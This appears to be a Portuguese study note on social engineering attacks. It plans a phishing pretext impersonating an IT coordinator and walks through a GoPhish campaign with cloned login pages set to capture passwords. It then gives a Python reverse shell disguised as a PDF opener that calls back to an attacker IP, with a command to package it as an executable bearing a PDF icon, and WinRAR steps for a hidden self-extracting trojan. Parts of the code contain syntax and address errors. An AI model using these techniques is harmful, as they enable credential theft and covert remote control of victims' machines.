# Engenharia Social

### Como Fazer?  
- Definir o objetivo  
Acessar página falsa para roubo de credenciais  
- Estudar o alvo  
Coletar informações da empresa, personificar colaborador, e-mail etc.  
- Criar o contexto (Método)  
O acesso da conta da vítima no sistema (alvo) está suspeito.
- Criar a sua persona (Quem você será)  
José dos Santos - Coordenador do departamento de TI
- Definir a melhor abordagem (Tipo)  
Enviar e-mail sem link e anexo depois enviar e-mail com link em um doc.  
- Pensar em todas as possibilidades de erros e problemas  
Não clicar, não responder, reportar a segurança.  
- Executar o ataque  
Durante horário comercial, final da tarde.  

## Campanhas de Phising    
Vamos utilizar a ferramenta [GoPhising](https://getgophish.com/) para realizar uma campanha.  
após o download acesse o arquivo `config.json` e informe seu IP no admin_server.  

Crie um novo grupo com os usuários alvos em **Users & Groups** e crie um novo template de e-mail que será enviado em **Email Templates**.  
Depois podemos criar a página falsa que será usada em **Landing Pages**.  
Em **Sending Profiles** devemos configurar o perfil do remetente do e-mail e o servidor de SMTP que irá fazer o envio.  

**Utilizando contas g-mail como remetente:** Nas configurações do gmail, habilite a opção **Less secure app access** e desabilite o **2 Step Verification**.  

Após todas as configurações, crie uma nova camapanha em **Campaigns**.  

### Criando Templates de E-mails    
No gmail podemos ir no e-mail que gostariamos de transformar em template, acessar a opção **show original** e copiar o e-mail.  
Depois em **Email Templates** utilizamos a opção **Import Email**.  

### Criando Templates de Sites    
Para criar um template igual a outro site utilize a opção **Savar Como** do navegador e faça uma cópia da página.  
Depois suba um servidor web na pasta do site baixado e utilize a opção **Import Site** para importar a página do servidor local, marque as opções de **Capture Submitted Data** e **Capture Passwords**, e configure a página de redirecionamento da vítima.  
Sempre verifique os controles de formulário das páginas antes de disparar a campanha.  

## Shell com PDF Forjado (Código Indetectável)  

```
import socket,os

# Incluir a abertura de um link PDF
os.popen ('explorer $LINK_PDF')

ip = "19.168.0.200
porta = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,porta))

while True:
    cmd = s.recv(1024)
    for comando in os.popen(cmd):
        s.send(comando)
```

Utilizando o `pyinstaller` podemos converter o código python em executável.  
```
 pyinstaller $FILE --onefile --windowed --icon=pdf.ico
```

Abra a porta na máquina atacante e execute o arquivo no alvo.  

## Cavalo de Tróia  
Para criar um cavalo de tróia iremos utilizar o código criado em Shell com PDF Forjado e outra aplicação que será mesclada.  
Utilize o WinRAR para compactar o exploit e o aplicativo original e marque a opção **Create SFX archive** e em avançado faça as seguinte configurações:  

- **General:**  
Patch to extract: **C:\Windows\System32\\**   
- **Setup:**  
Run after extraction: **Primeiro o original e depois o exploit**  
- **Modes:**  
Marcar: **Hide all**  
- **Update:**  
Overwrite mode: **Overwrite all files**  
- **Test and icon:**  
Escolha o íconedo executavel    

## Referencias:  

### Livros:  
- Mitnick - A Arte de Anganar  
- A Arte de Invadir  

### Filmes:  
- Prenda-me Se For Capaz  
- VIPs 


